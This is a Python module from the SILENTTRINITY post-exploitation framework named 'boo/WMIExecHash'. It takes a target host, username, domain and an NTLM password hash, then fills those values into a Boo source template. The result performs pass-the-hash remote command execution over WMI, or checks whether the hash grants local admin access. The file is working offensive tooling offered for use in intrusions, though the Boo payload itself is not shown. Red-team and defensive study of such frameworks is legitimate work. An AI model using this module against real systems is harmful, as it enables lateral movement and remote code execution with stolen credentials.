from silenttrinity.core.utils import get_path_in_package
from silenttrinity.core.teamserver.module import Module


class STModule(Module):
    def __init__(self):
        self.name = 'boo/WMIExecHash'
        self.language = 'boo'
        self.description = 'Remote code execution using WMI with NTLM Hash'
        self.author = '@RemiEscourrou'
        self.references = []
        self.options = {
            'Host': {
                'Description'   :   'Target IP or Hostname',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Command': {
                'Description'   :   'Command to execute on the target. \nIf not specified, will check if the username and hash provide local admin access',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Username': {
                'Description'   :   'Username to use for the WMI connection',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Domain': {
                'Description'   :   'Domain to use for authentication. \nThis parameter is not needed with local accounts or when using @domain after the username',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Hash': {
                'Description'   :   'NTLM Password hash for authentication. \nThis module will accept either LM:NTLM or NTLM format',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

    def payload(self):
        with open(get_path_in_package('core/teamserver/modules/boo/src/WMIExecHash.boo'), 'r') as module_src:
            src = module_src.read()
            src = src.replace('TARGET', self.options['Host']['Value'])
            src = src.replace('USERNAME', self.options['Username']['Value'])
            src = src.replace('DOMAIN', self.options['Domain']['Value'])
            src = src.replace('HASH', self.options['Hash']['Value'])
            src = src.replace('COMMAND', self.options['Command']['Value'])
            return src
